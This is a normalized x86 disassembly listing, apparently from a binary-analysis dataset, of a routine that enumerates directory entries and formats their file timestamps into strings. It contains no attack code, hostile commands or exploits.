mov [ ebp - 0x6b0 ] eax
xor ecx ecx
push 0xa
mov [ ebp - 0x64 ] cx
push r--data
lea ecx [ ebp - 0x64 ]
mov [ ebp - 0x4 ] 0x49
mov [ ebp - 0x50 ] esi
mov [ ebp - 0x54 ] ebx
call sub_403650
movzx edx [ ebp - 0x458 ]
mov [ ebp - 0x6ac ] edx
sub esp 0x8
lea eax [ ebp - 0x3ac ]
fild [ ebp - 0x6ac ]
mov [ ebp - 0x4 ] 0x4a
fstp [ esp ]
push eax
call sub_413560
add esp 0xc
mov [ ebp - 0x6b8 ] eax
xor ecx ecx
push 0x1
mov [ ebp - 0x4 ] 0x4b
mov [ ebp - 0x6c ] esi
mov [ ebp - 0x70 ] ebx
mov [ ebp - 0x80 ] cx
push r--data
lea ecx [ ebp - 0x80 ]
call sub_403650
movzx edx [ ebp - 0x456 ]
mov [ ebp - 0x6ac ] edx
sub esp 0x8
lea eax [ ebp - 0x358 ]
fild [ ebp - 0x6ac ]
mov [ ebp - 0x4 ] 0x4c
fstp [ esp ]
push eax
call sub_413560
add esp 0xc
mov [ ebp - 0x6c0 ] eax
xor ecx ecx
push 0x1
mov [ ebp - 0x9c ] cx
push r--data
lea ecx [ ebp - 0x9c ]
mov [ ebp - 0x4 ] 0x4d
mov [ ebp - 0x88 ] esi
mov [ ebp - 0x8c ] ebx
call sub_403650
movzx edx [ ebp - 0x452 ]
mov [ ebp - 0x6ac ] edx
sub esp 0x8
lea eax [ ebp - 0x390 ]
fild [ ebp - 0x6ac ]
mov [ ebp - 0x4 ] 0x4e
fstp [ esp ]
push eax
call sub_413560
mov [ ebp - 0x6ac ] eax
mov ecx [ ebp - 0x688 ]
push ebx
push ecx
lea edx [ ebp - 0x374 ]
push edx
mov [ ebp - 0x4 ] 0x4f
call sub_4134d0
push eax
lea eax [ ebp - 0x3e4 ]
push eax
lea ecx [ ebp - 0x33c ]
push ecx
mov [ ebp - 0x4 ] 0x50
call sub_407e50
lea edx [ ebp - 0x1ec ]
push edx
push eax
lea eax [ ebp - 0x304 ]
push eax
mov [ ebp - 0x4 ] 0x51
call sub_407e00
mov ecx [ ebp - 0x6ac ]
push ecx
push eax
lea edx [ ebp - 0x208 ]
push edx
mov [ ebp - 0x4 ] 0x52
call sub_413870
lea ecx [ ebp - 0x9c ]
push ecx
push eax
lea edx [ ebp - 0x278 ]
push edx
mov [ ebp - 0x4 ] 0x53
call sub_413870
add esp 0x48
mov ecx [ ebp - 0x6c0 ]
push ecx
mov [ ebp - 0x4 ] 0x54
push eax
lea edx [ ebp - 0x2b0 ]
push edx
call sub_413870
lea ecx [ ebp - 0x80 ]
push ecx
push eax
lea edx [ ebp - 0x2e8 ]
push edx
mov [ ebp - 0x4 ] 0x55
call sub_413870
mov ecx [ ebp - 0x6b8 ]
push ecx
push eax
lea edx [ ebp - 0x294 ]
push edx
mov [ ebp - 0x4 ] 0x56
call sub_413870
lea ecx [ ebp - 0x64 ]
push ecx
push eax
lea edx [ ebp - 0x240 ]
push edx
mov [ ebp - 0x4 ] 0x57
call sub_413870
mov ecx [ ebp - 0x6b0 ]
push ecx
push eax
lea edx [ ebp - 0x25c ]
push edx
mov [ ebp - 0x4 ] 0x58
call sub_413870
lea ecx [ ebp - 0x1b4 ]
push ecx
push eax
lea edx [ ebp - 0x2cc ]
push edx
mov [ ebp - 0x4 ] 0x59
call sub_413870
add esp 0x48
push edi
push eax
lea eax [ ebp - 0x198 ]
push eax
mov [ ebp - 0x4 ] 0x5a
call sub_413870
lea ecx [ ebp - 0x400 ]
push ecx
push eax
lea edx [ ebp - 0xf0 ]
push edx
mov [ ebp - 0x4 ] 0x5b
call sub_407e00
lea ecx [ ebp + 0x8 ]
push ecx
push eax
lea edx [ ebp - 0x10c ]
push edx
mov [ ebp - 0x4 ] 0x5c
call sub_407e00
lea ecx [ ebp - 0x1d0 ]
push ecx
push eax
lea edx [ ebp - 0x144 ]
push edx
mov [ ebp - 0x4 ] 0x5d
call sub_413870
lea ecx [ ebp - 0xb8 ]
push ecx
mov [ ebp - 0x4 ] 0x5e
push eax
lea edx [ ebp - 0x128 ]
push edx
call sub_413870
lea ecx [ ebp - 0x1ec ]
push ecx
push eax
lea edx [ ebp - 0xd4 ]
push edx
mov [ ebp - 0x4 ] 0x5f
call sub_407e00
add esp 0x48
lea ecx [ ebp - 0x3c8 ]
push ecx
push eax
lea edx [ ebp - 0x2c ]
push edx
mov [ ebp - 0x4 ] 0x60
call sub_407e00
add esp 0xc
push eax
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x61
call sub_403a40
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
cmp [ ebp - 0x398 ] 0x8
jb r-xdata
cmp [ ebp - 0x34 ] 0x8
jb r-xdata
xor ecx ecx
mov [ ebp - 0xc0 ] esi
mov [ ebp - 0xc4 ] ebx
mov [ ebp - 0xd4 ] cx
cmp [ ebp - 0x114 ] edi
jb r-xdata
mov eax [ ebp - 0xd4 ]
push eax
call sub_41a0d6
add esp 0x4
cmp [ ebp + 0x40 ] bl
jne r-xdata
xor ecx ecx
mov edi 0x8
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] cx
cmp [ ebp - 0xc0 ] edi
jb r-xdata
mov eax [ ebp - 0x2c ]
push eax
call sub_41a0d6
add esp 0x4
xor eax eax
cmp [ ebp - 0x344 ] 0x8
mov [ ebp - 0x398 ] esi
mov [ ebp - 0x39c ] ebx
mov [ ebp - 0x3ac ] ax
jb r-xdata
mov edx [ ebp - 0x3ac ]
push edx
call sub_41a0d6
add esp 0x4
xor edx edx
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x48 ] dx
cmp [ edi + 0x14 ] 0x8
jae r-xdata
mov ecx [ ebp - 0x48 ]
push ecx
call sub_41a0d6
add esp 0x4
xor eax eax
mov [ ebp - 0x114 ] esi
mov [ ebp - 0x118 ] ebx
mov [ ebp - 0x128 ] ax
cmp [ ebp - 0x130 ] edi
jb r-xdata
mov edx [ ebp - 0x128 ]
push edx
call sub_41a0d6
add esp 0x4
push r--data
lea ecx [ ebp - 0x160 ]
call sub_403cc0
push eax
lea edx [ ebp + 0x8 ]
push edx
lea eax [ ebp - 0x17c ]
push eax
mov [ ebp - 0x4 ] 0x6b
call sub_407e50
add esp 0xc
push eax
lea ecx [ ebp - 0x320 ]
mov [ ebp - 0x4 ] 0x6c
call sub_403a40
lea ecx [ ebp - 0x17c ]
call sub_401900
lea ecx [ ebp - 0x160 ]
mov [ ebp - 0x4 ] 0xd
call sub_401900
mov eax [ ebp - 0x320 ]
cmp [ ebp - 0x30c ] edi
jae r-xdata
cmp [ ebp - 0x30c ] edi
jb r-xdata
xor eax eax
mov [ ebp - 0xc0 ] esi
mov [ ebp - 0xc4 ] ebx
mov [ ebp - 0xd4 ] ax
cmp [ ebp - 0x114 ] edi
jb r-xdata
mov edx [ ebp - 0xd4 ]
push edx
call sub_41a0d6
add esp 0x4
xor edx edx
cmp [ ebp - 0x37c ] 0x8
mov [ ebp - 0x344 ] esi
mov [ ebp - 0x348 ] ebx
mov [ ebp - 0x358 ] dx
jb r-xdata
mov ecx [ ebp - 0x358 ]
push ecx
call sub_41a0d6
add esp 0x4
mov edx [ edi ]
mov [ ebp - 0x48 ] edx
mov [ edi ] ebx
mov eax [ edi + 0x10 ]
inc eax
add eax eax
push eax
lea ecx [ ebp - 0x48 ]
push edi
push ecx
call sub_41a460
add esp 0xc
jmp r-xdata
xor edx edx
mov [ ebp - 0x130 ] esi
mov [ ebp - 0x134 ] ebx
mov [ ebp - 0x144 ] dx
cmp [ ebp - 0xf8 ] edi
jb r-xdata
mov ecx [ ebp - 0x144 ]
push ecx
call sub_41a0d6
add esp 0x4
lea ecx [ ebp - 0x6a8 ]
push ecx
push eax
call [ FindFirstFileW@IAT ]
mov edi eax
mov [ ebp - 0x6c4 ] edi
cmp edi 0xffffffff
je r-xdata
lea eax [ ebp - 0x320 ]
xor ecx ecx
mov [ ebp - 0x30c ] esi
mov [ ebp - 0x310 ] ebx
mov [ ebp - 0x320 ] cx
cmp [ ebp - 0x3b4 ] edi
jb r-xdata
mov eax [ ebp - 0x320 ]
push eax
call sub_41a0d6
add esp 0x4
xor edx edx
mov [ ebp - 0x114 ] esi
mov [ ebp - 0x118 ] ebx
mov [ ebp - 0x128 ] dx
cmp [ ebp - 0x130 ] edi
jb r-xdata
mov ecx [ ebp - 0x128 ]
push ecx
call sub_41a0d6
add esp 0x4
xor ecx ecx
cmp [ ebp - 0x360 ] 0x8
mov [ ebp - 0x37c ] esi
mov [ ebp - 0x380 ] ebx
mov [ ebp - 0x390 ] cx
jb r-xdata
mov eax [ ebp - 0x390 ]
push eax
call sub_41a0d6
add esp 0x4
mov eax [ edi + 0x10 ]
mov [ ebp - 0x38 ] eax
mov ecx [ edi + 0x14 ]
mov [ ebp - 0x34 ] ecx
mov [ edi + 0x10 ] ebx
mov [ edi + 0x14 ] ebx
xor ecx ecx
mov [ ebp - 0xf8 ] esi
mov [ ebp - 0xfc ] ebx
mov [ ebp - 0x10c ] cx
cmp [ ebp - 0xdc ] edi
jb r-xdata
mov eax [ ebp - 0x10c ]
push eax
call sub_41a0d6
add esp 0x4
lea ecx [ ebp - 0x320 ]
call sub_401900
lea ecx [ ebp - 0x3c8 ]
call sub_401900
lea ecx [ ebp - 0x400 ]
call sub_401900
lea ecx [ ebp - 0x1ec ]
call sub_401900
lea ecx [ ebp - 0x3e4 ]
call sub_401900
lea ecx [ ebp - 0x48 ]
call sub_401900
lea ecx [ ebp - 0x224 ]
call sub_401900
lea ecx [ ebp + 0x8 ]
call sub_401900
lea ecx [ ebp + 0x24 ]
call sub_401900
jmp r-xdata
xor eax eax
mov [ ebp - 0x3b4 ] esi
mov [ ebp - 0x3b8 ] ebx
mov [ ebp - 0x3c8 ] ax
cmp [ ebp - 0x3ec ] edi
jb r-xdata
mov edx [ ebp - 0x3c8 ]
push edx
call sub_41a0d6
add esp 0x4
xor ecx ecx
mov [ ebp - 0x130 ] esi
mov [ ebp - 0x134 ] ebx
mov [ ebp - 0x144 ] cx
cmp [ ebp - 0xf8 ] edi
jb r-xdata
mov eax [ ebp - 0x144 ]
push eax
call sub_41a0d6
add esp 0x4
xor eax eax
cmp [ ebp - 0x328 ] 0x8
mov [ ebp - 0x360 ] esi
mov [ ebp - 0x364 ] ebx
mov [ ebp - 0x374 ] ax
jb r-xdata
mov edx [ ebp - 0x374 ]
push edx
call sub_41a0d6
add esp 0x4
xor eax eax
mov [ ebp - 0xdc ] esi
mov [ ebp - 0xe0 ] ebx
mov [ ebp - 0xf0 ] ax
mov [ ebp - 0x4 ] 0xd
cmp [ ebp - 0x184 ] edi
jb r-xdata
mov edx [ ebp - 0xf0 ]
push edx
call sub_41a0d6
add esp 0x4
test [ ebp - 0x6a8 ] 0x10
je r-xdata
xor edx edx
mov [ ebp - 0x3ec ] esi
mov [ ebp - 0x3f0 ] ebx
mov [ ebp - 0x400 ] dx
cmp [ ebp - 0x1d8 ] edi
jb r-xdata
mov ecx [ ebp - 0x400 ]
push ecx
call sub_41a0d6
add esp 0x4
xor eax eax
mov [ ebp - 0xf8 ] esi
mov [ ebp - 0xfc ] ebx
mov [ ebp - 0x10c ] ax
cmp [ ebp - 0xdc ] edi
jb r-xdata
mov edx [ ebp - 0x10c ]
push edx
call sub_41a0d6
add esp 0x4
xor edx edx
cmp [ ebp - 0x2f0 ] 0x8
mov [ ebp - 0x328 ] esi
mov [ ebp - 0x32c ] ebx
mov [ ebp - 0x33c ] dx
jb r-xdata
mov ecx [ ebp - 0x33c ]
push ecx
call sub_41a0d6
add esp 0x4
mov ecx [ ebp - 0x6b4 ]
push 0xffffffff
push ebx
lea edx [ ebp - 0x48 ]
push edx
add ecx 0x8
call sub_4077d0
mov ecx [ ebp - 0x198 ]
push ecx
call sub_41a0d6
add esp 0x4
lea eax [ ebp - 0x6a8 ]
push eax
push edi
call [ FindNextFileW@IAT ]
test eax eax
jne r-xdata
cmp [ ebp - 0x67c ] 0x2e
je r-xdata
xor ecx ecx
mov [ ebp - 0x1d8 ] esi
mov [ ebp - 0x1dc ] ebx
mov [ ebp - 0x1ec ] cx
cmp [ ebp - 0x3d0 ] edi
jb r-xdata
mov eax [ ebp - 0x1ec ]
push eax
call sub_41a0d6
add esp 0x4
xor edx edx
mov [ ebp - 0xdc ] esi
mov [ ebp - 0xe0 ] ebx
mov [ ebp - 0xf0 ] dx
cmp [ ebp - 0x184 ] edi
jb r-xdata
mov ecx [ ebp - 0xf0 ]
push ecx
call sub_41a0d6
add esp 0x4
xor ecx ecx
cmp [ ebp - 0x1f4 ] 0x8
mov [ ebp - 0x2f0 ] esi
mov [ ebp - 0x2f4 ] ebx
mov [ ebp - 0x304 ] cx
jb r-xdata
mov eax [ ebp - 0x304 ]
push eax
call sub_41a0d6
add esp 0x4
push edi
call [ FindClose@IAT ]
lea edx [ ebp - 0x42c ]
push edx
lea eax [ ebp - 0x69c ]
push eax
call [ FileTimeToSystemTime@IAT ]
lea ecx [ ebp - 0x458 ]
push ecx
lea edx [ ebp - 0x42c ]
push edx
push ebx
call [ SystemTimeToTzSpecificLocalTime@IAT ]
lea eax [ ebp - 0x67c ]
push eax
lea ecx [ ebp - 0xd4 ]
call sub_403cc0
mov edi eax
push r--data
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x6d
call sub_403cc0
push eax
lea ecx [ ebp + 0x8 ]
push ecx
lea edx [ ebp - 0x160 ]
push edx
mov [ ebp - 0x4 ] 0x6e
call sub_407e50
push edi
push eax
lea eax [ ebp - 0x17c ]
push eax
mov [ ebp - 0x4 ] 0x6f
call sub_413870
add esp 0x18
push eax
lea ecx [ ebp - 0x320 ]
mov [ ebp - 0x4 ] 0x70
call sub_403a40
cmp [ ebp - 0x168 ] 0x8
jb r-xdata
xor eax eax
mov [ ebp - 0x3d0 ] esi
mov [ ebp - 0x3d4 ] ebx
mov [ ebp - 0x3e4 ] ax
cmp [ ebp - 0x34 ] edi
jb r-xdata
mov edx [ ebp - 0x3e4 ]
push edx
call sub_41a0d6
add esp 0x4
xor ecx ecx
mov [ ebp - 0x184 ] esi
mov [ ebp - 0x188 ] ebx
mov [ ebp - 0x198 ] cx
cmp [ ebp - 0x2b8 ] edi
jb r-xdata
mov eax [ ebp - 0x198 ]
push eax
call sub_41a0d6
add esp 0x4
xor eax eax
cmp [ ebp - 0x264 ] 0x8
mov [ ebp - 0x1f4 ] esi
mov [ ebp - 0x1f8 ] ebx
mov [ ebp - 0x208 ] ax
jb r-xdata
mov edx [ ebp - 0x208 ]
push edx
call sub_41a0d6
add esp 0x4
xor edx edx
mov edi 0x8
mov [ ebp - 0x168 ] esi
mov [ ebp - 0x16c ] ebx
mov [ ebp - 0x17c ] dx
cmp [ ebp - 0x14c ] edi
jb r-xdata
mov ecx [ ebp - 0x17c ]
push ecx
call sub_41a0d6
add esp 0x4
xor edx edx
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x48 ] dx
cmp [ ebp - 0x210 ] edi
jb r-xdata
mov ecx [ ebp - 0x48 ]
push ecx
call sub_41a0d6
add esp 0x4
xor eax eax
mov [ ebp - 0x2b8 ] esi
mov [ ebp - 0x2bc ] ebx
mov [ ebp - 0x2cc ] ax
cmp [ ebp - 0x248 ] edi
jb r-xdata
mov edx [ ebp - 0x2cc ]
push edx
call sub_41a0d6
add esp 0x4
xor edx edx
cmp [ ebp - 0x29c ] 0x8
mov [ ebp - 0x264 ] esi
mov [ ebp - 0x268 ] ebx
mov [ ebp - 0x278 ] dx
jb r-xdata
mov ecx [ ebp - 0x278 ]
push ecx
call sub_41a0d6
add esp 0x4
xor ecx ecx
mov [ ebp - 0x14c ] esi
mov [ ebp - 0x150 ] ebx
mov [ ebp - 0x160 ] cx
cmp [ ebp - 0x18 ] edi
jb r-xdata
mov eax [ ebp - 0x160 ]
push eax
call sub_41a0d6
add esp 0x4
xor ecx ecx
mov [ ebp - 0x210 ] esi
mov [ ebp - 0x214 ] ebx
mov [ ebp - 0x224 ] cx
cmp [ ebp + 0x1c ] edi
jb r-xdata
mov eax [ ebp - 0x224 ]
push eax
call sub_41a0d6
add esp 0x4
xor edx edx
mov [ ebp - 0x248 ] esi
mov [ ebp - 0x24c ] ebx
mov [ ebp - 0x25c ] dx
cmp [ ebp - 0x22c ] edi
jb r-xdata
mov ecx [ ebp - 0x25c ]
push ecx
call sub_41a0d6
add esp 0x4
xor ecx ecx
cmp [ ebp - 0x2d4 ] 0x8
mov [ ebp - 0x29c ] esi
mov [ ebp - 0x2a0 ] ebx
mov [ ebp - 0x2b0 ] cx
jb r-xdata
mov eax [ ebp - 0x2b0 ]
push eax
call sub_41a0d6
add esp 0x4
xor eax eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] ax
mov [ ebp - 0x4 ] 0xd
cmp [ ebp - 0xc0 ] edi
jb r-xdata
mov edx [ ebp - 0x2c ]
push edx
call sub_41a0d6
add esp 0x4
xor eax eax
mov [ ebp + 0x1c ] esi
mov [ ebp + 0x18 ] ebx
mov [ ebp + 0x8 ] ax
cmp [ ebp + 0x38 ] edi
jb r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_41a0d6
add esp 0x4
xor ecx ecx
mov [ ebp - 0x22c ] esi
mov [ ebp - 0x230 ] ebx
mov [ ebp - 0x240 ] cx
cmp [ ebp - 0x280 ] edi
jb r-xdata
mov eax [ ebp - 0x240 ]
push eax
call sub_41a0d6
add esp 0x4
xor eax eax
cmp [ ebp - 0x280 ] 0x8
mov [ ebp - 0x2d4 ] esi
mov [ ebp - 0x2d8 ] ebx
mov [ ebp - 0x2e8 ] ax
jb r-xdata
mov edx [ ebp - 0x2e8 ]
push edx
call sub_41a0d6
add esp 0x4
lea edx [ ebp + 0x24 ]
push r--data
push edx
call sub_406dc0
add esp 0x8
test al al
je r-xdata
mov ecx [ ebp - 0xd4 ]
push ecx
call sub_41a0d6
add esp 0x4
mov al 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_41ac09
mov esp ebp
pop ebp
retn 0x40
mov ecx [ ebp + 0x24 ]
push ecx
call sub_41a0d6
add esp 0x4
jmp r-xdata
xor eax eax
mov [ ebp - 0x280 ] esi
mov [ ebp - 0x284 ] ebx
mov [ ebp - 0x294 ] ax
cmp [ ebp - 0x2d4 ] edi
jb r-xdata
mov edx [ ebp - 0x294 ]
push edx
call sub_41a0d6
add esp 0x4
xor edx edx
cmp [ ebp - 0x22c ] 0x8
mov [ ebp - 0x280 ] esi
mov [ ebp - 0x284 ] ebx
mov [ ebp - 0x294 ] dx
jb r-xdata
mov ecx [ ebp - 0x294 ]
push ecx
call sub_41a0d6
add esp 0x4
mov ecx [ ebp + 0x44 ]
mov edx [ ebp + 0x40 ]
push ecx
push edx
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x6bc ] esp
push 0xffffffff
push ebx
lea edx [ ebp + 0x24 ]
xor eax eax
mov [ ecx + 0x14 ] esi
mov [ ecx + 0x10 ] ebx
push edx
mov [ ecx ] ax
call sub_401ae0
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x6c8 ] esp
push 0xffffffff
push ebx
lea edx [ ebp - 0x320 ]
xor eax eax
mov [ ecx + 0x14 ] esi
mov [ ecx + 0x10 ] ebx
push edx
mov [ ebp - 0x4 ] 0x8e
mov [ ecx ] ax
call sub_401ae0
mov ecx [ ebp - 0x6b4 ]
mov [ ebp - 0x4 ] 0xd
call sub_413d40
mov edi [ ebp - 0x6c4 ]
lea eax [ ebp - 0x67c ]
push eax
lea ecx [ ebp - 0x1d0 ]
call sub_403cc0
mov edi eax
push r--data
lea ecx [ ebp - 0x1b4 ]
mov [ ebp - 0x4 ] 0x71
call sub_403cc0
mov [ ebp - 0x6bc ] eax
movzx ecx [ ebp - 0x44e ]
mov [ ebp - 0x6ac ] ecx
sub esp 0x8
lea edx [ ebp - 0x64 ]
fild [ ebp - 0x6ac ]
mov [ ebp - 0x4 ] 0x72
fstp [ esp ]
push edx
call sub_413560
add esp 0xc
mov [ ebp - 0x6c8 ] eax
push r--data
lea ecx [ ebp - 0x80 ]
mov [ ebp - 0x4 ] 0x73
call sub_403cc0
mov [ ebp - 0x6d8 ] eax
movzx eax [ ebp - 0x450 ]
mov [ ebp - 0x6ac ] eax
sub esp 0x8
lea ecx [ ebp - 0x9c ]
fild [ ebp - 0x6ac ]
mov [ ebp - 0x4 ] 0x74
fstp [ esp ]
push ecx
call sub_413560
add esp 0xc
mov [ ebp - 0x6cc ] eax
push r--data
lea ecx [ ebp - 0xb8 ]
mov [ ebp - 0x4 ] 0x75
call sub_403cc0
mov [ ebp - 0x6d4 ] eax
movzx edx [ ebp - 0x458 ]
mov [ ebp - 0x6ac ] edx
sub esp 0x8
lea eax [ ebp - 0x3ac ]
fild [ ebp - 0x6ac ]
mov [ ebp - 0x4 ] 0x76
fstp [ esp ]
push eax
call sub_413560
add esp 0xc
mov [ ebp - 0x6d0 ] eax
push r--data
lea ecx [ ebp - 0x358 ]
mov [ ebp - 0x4 ] 0x77
call sub_403cc0
mov [ ebp - 0x6b0 ] eax
movzx ecx [ ebp - 0x456 ]
mov [ ebp - 0x6ac ] ecx
sub esp 0x8
lea edx [ ebp - 0x390 ]
fild [ ebp - 0x6ac ]
mov [ ebp - 0x4 ] 0x78
fstp [ esp ]
push edx
call sub_413560
add esp 0xc
mov [ ebp - 0x6b8 ] eax
mov [ ebp - 0x4 ] 0x79
push r--data
lea ecx [ ebp - 0x374 ]
call sub_403cc0
mov [ ebp - 0x6c0 ] eax
movzx eax [ ebp - 0x452 ]
mov [ ebp - 0x6ac ] eax
sub esp 0x8
lea ecx [ ebp - 0x33c ]
fild [ ebp - 0x6ac ]
mov [ ebp - 0x4 ] 0x7a
fstp [ esp ]
push ecx
call sub_413560
mov [ ebp - 0x6ac ] eax
mov edx [ ebp - 0x688 ]
push ebx
push edx
lea eax [ ebp - 0x304 ]
push eax
mov [ ebp - 0x4 ] 0x7b
call sub_4134d0
push eax
lea ecx [ ebp - 0x3e4 ]
push ecx
lea edx [ ebp - 0x208 ]
push edx
mov [ ebp - 0x4 ] 0x7c
call sub_407e50
lea ecx [ ebp - 0x1ec ]
push ecx
push eax
lea edx [ ebp - 0x278 ]
push edx
mov [ ebp - 0x4 ] 0x7d
call sub_407e00
mov ecx [ ebp - 0x6ac ]
push ecx
push eax
lea edx [ ebp - 0x2b0 ]
push edx
mov [ ebp - 0x4 ] 0x7e
call sub_413870
mov ecx [ ebp - 0x6c0 ]
push ecx
push eax
lea edx [ ebp - 0x2e8 ]
push edx
mov [ ebp - 0x4 ] 0x7f
call sub_413870
add esp 0x48
mov ecx [ ebp - 0x6b8 ]
push ecx
push eax
lea edx [ ebp - 0x294 ]
push edx
mov [ ebp - 0x4 ] 0x80
call sub_413870
mov ecx [ ebp - 0x6b0 ]
push ecx
push eax
lea edx [ ebp - 0x240 ]
push edx
mov [ ebp - 0x4 ] 0x81
call sub_413870
mov ecx [ ebp - 0x6d0 ]
push ecx
push eax
lea edx [ ebp - 0x25c ]
push edx
mov [ ebp - 0x4 ] 0x82
call sub_413870
mov ecx [ ebp - 0x6d4 ]
mov [ ebp - 0x4 ] 0x83
push ecx
push eax
lea edx [ ebp - 0x2cc ]
push edx
call sub_413870
mov ecx [ ebp - 0x6cc ]
push ecx
push eax
lea edx [ ebp - 0x198 ]
push edx
mov [ ebp - 0x4 ] 0x84
call sub_413870
mov ecx [ ebp - 0x6d8 ]
push ecx
push eax
lea edx [ ebp - 0xf0 ]
push edx
mov [ ebp - 0x4 ] 0x85
call sub_413870
add esp 0x48
mov ecx [ ebp - 0x6c8 ]
push ecx
push eax
lea edx [ ebp - 0x10c ]
push edx
mov [ ebp - 0x4 ] 0x86
call sub_413870
lea ecx [ ebp - 0x1ec ]
push ecx
push eax
lea edx [ ebp - 0x144 ]
push edx
mov [ ebp - 0x4 ] 0x87
call sub_407e00
lea ecx [ ebp + 0x8 ]
push ecx
push eax
lea edx [ ebp - 0x128 ]
push edx
mov [ ebp - 0x4 ] 0x88
call sub_407e00
mov ecx [ ebp - 0x6bc ]
push ecx
push eax
lea edx [ ebp - 0xd4 ]
push edx
mov [ ebp - 0x4 ] 0x89
call sub_413870
push edi
push eax
lea eax [ ebp - 0x2c ]
push eax
mov [ ebp - 0x4 ] 0x8a
call sub_413870
lea ecx [ ebp - 0x1ec ]
push ecx
push eax
lea edx [ ebp - 0x160 ]
push edx
mov [ ebp - 0x4 ] 0x8b
call sub_407e00
add esp 0x48
lea ecx [ ebp - 0x3c8 ]
push ecx
push eax
lea edx [ ebp - 0x17c ]
push edx
mov [ ebp - 0x4 ] 0x8c
call sub_407e00
add esp 0xc
mov [ ebp - 0x4 ] 0x8d
push eax
lea ecx [ ebp - 0x48 ]
call sub_403a40
lea ecx [ ebp - 0x17c ]
call sub_401900
lea ecx [ ebp - 0x160 ]
call sub_401900
lea ecx [ ebp - 0x2c ]
call sub_401900
lea ecx [ ebp - 0xd4 ]
call sub_401900
lea ecx [ ebp - 0x128 ]
call sub_401900
lea ecx [ ebp - 0x144 ]
call sub_401900
lea ecx [ ebp - 0x10c ]
call sub_401900
lea ecx [ ebp - 0xf0 ]
call sub_401900
lea ecx [ ebp - 0x198 ]
call sub_401900
lea ecx [ ebp - 0x2cc ]
call sub_401900
lea ecx [ ebp - 0x25c ]
call sub_401900
lea ecx [ ebp - 0x240 ]
call sub_401900
lea ecx [ ebp - 0x294 ]
call sub_401900
lea ecx [ ebp - 0x2e8 ]
call sub_401900
lea ecx [ ebp - 0x2b0 ]
call sub_401900
lea ecx [ ebp - 0x278 ]
call sub_401900
lea ecx [ ebp - 0x208 ]
call sub_401900
lea ecx [ ebp - 0x304 ]
call sub_401900
lea ecx [ ebp - 0x33c ]
call sub_401900
lea ecx [ ebp - 0x374 ]
call sub_401900
lea ecx [ ebp - 0x390 ]
call sub_401900
lea ecx [ ebp - 0x358 ]
call sub_401900
lea ecx [ ebp - 0x3ac ]
call sub_401900
lea ecx [ ebp - 0xb8 ]
call sub_401900
lea ecx [ ebp - 0x9c ]
call sub_401900
lea ecx [ ebp - 0x80 ]
call sub_401900
lea ecx [ ebp - 0x64 ]
call sub_401900
lea ecx [ ebp - 0x1b4 ]
call sub_401900
lea ecx [ ebp - 0x1d0 ]
mov [ ebp - 0x4 ] 0xd
call sub_401900
mov ecx [ ebp - 0x6b4 ]
push 0xffffffff
push ebx
lea eax [ ebp - 0x48 ]
push eax
add ecx 0x8
call sub_4077d0
xor edx edx
mov [ ebp - 0x2d4 ] esi
mov [ ebp - 0x2d8 ] ebx
mov [ ebp - 0x2e8 ] dx
cmp [ ebp - 0x29c ] edi
jb r-xdata
mov ecx [ ebp - 0x2e8 ]
push ecx
call sub_41a0d6
add esp 0x4
xor ecx ecx
cmp [ ebp - 0x248 ] 0x8
mov [ ebp - 0x22c ] esi
mov [ ebp - 0x230 ] ebx
mov [ ebp - 0x240 ] cx
jb r-xdata
mov eax [ ebp - 0x240 ]
push eax
call sub_41a0d6
add esp 0x4
xor ecx ecx
mov [ ebp - 0x29c ] esi
mov [ ebp - 0x2a0 ] ebx
mov [ ebp - 0x2b0 ] cx
cmp [ ebp - 0x264 ] edi
jb r-xdata
mov eax [ ebp - 0x2b0 ]
push eax
call sub_41a0d6
add esp 0x4
xor eax eax
cmp [ ebp - 0x2b8 ] 0x8
mov [ ebp - 0x248 ] esi
mov [ ebp - 0x24c ] ebx
mov [ ebp - 0x25c ] ax
jb r-xdata
mov edx [ ebp - 0x25c ]
push edx
call sub_41a0d6
add esp 0x4
xor eax eax
mov [ ebp - 0x264 ] esi
mov [ ebp - 0x268 ] ebx
mov [ ebp - 0x278 ] ax
cmp [ ebp - 0x1f4 ] edi
jb r-xdata
mov edx [ ebp - 0x278 ]
push edx
call sub_41a0d6
add esp 0x4
xor edx edx
cmp [ ebp - 0x184 ] 0x8
mov [ ebp - 0x2b8 ] esi
mov [ ebp - 0x2bc ] ebx
mov [ ebp - 0x2cc ] dx
jb r-xdata
mov ecx [ ebp - 0x2cc ]
push ecx
call sub_41a0d6
add esp 0x4
xor edx edx
mov [ ebp - 0x1f4 ] esi
mov [ ebp - 0x1f8 ] ebx
mov [ ebp - 0x208 ] dx
cmp [ ebp - 0x2f0 ] edi
jb r-xdata
mov ecx [ ebp - 0x208 ]
push ecx
call sub_41a0d6
add esp 0x4
xor ecx ecx
cmp [ ebp - 0xdc ] 0x8
mov [ ebp - 0x184 ] esi
mov [ ebp - 0x188 ] ebx
mov [ ebp - 0x198 ] cx
jb r-xdata
mov eax [ ebp - 0x198 ]
push eax
call sub_41a0d6
add esp 0x4
xor ecx ecx
mov [ ebp - 0x2f0 ] esi
mov [ ebp - 0x2f4 ] ebx
mov [ ebp - 0x304 ] cx
cmp [ ebp - 0x328 ] edi
jb r-xdata
mov eax [ ebp - 0x304 ]
push eax
call sub_41a0d6
add esp 0x4
xor eax eax
cmp [ ebp - 0xf8 ] 0x8
mov [ ebp - 0xdc ] esi
mov [ ebp - 0xe0 ] ebx
mov [ ebp - 0xf0 ] ax
jb r-xdata
mov edx [ ebp - 0xf0 ]
push edx
call sub_41a0d6
add esp 0x4
xor eax eax
mov [ ebp - 0x328 ] esi
mov [ ebp - 0x32c ] ebx
mov [ ebp - 0x33c ] ax
cmp [ ebp - 0x360 ] edi
jb r-xdata
